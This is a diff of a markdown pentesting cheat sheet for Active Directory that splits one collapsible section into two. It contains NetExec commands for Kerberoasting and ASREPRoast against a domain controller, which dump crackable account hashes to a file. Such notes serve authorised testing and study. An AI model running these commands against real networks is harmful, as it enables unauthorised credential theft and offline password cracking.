@@ -813,14 +813,16 @@ u.objectid ENDS WITH "-548" RETURN q
 
 # Kerberoasting & ASREPRoast
 <details>
-  <summary> Roast </summary> 
+  <summary> Kerberoasting </summary> 
 
-  ### Kerberoasting
   ```shell
   NetExec ldap <Domain_Controller_IP> -u <username> -p <password> --kerberoasting <output>.txt
   ```
+  </details> 
 
-  ### ASREPRoast
+  <details>
+  <summary> ASREPRoast </summary> 
+
   ```shell
   NetExec ldap <Domain_Controller_IP> -u <username> -p '' --asreproast <output>.txt
   ```
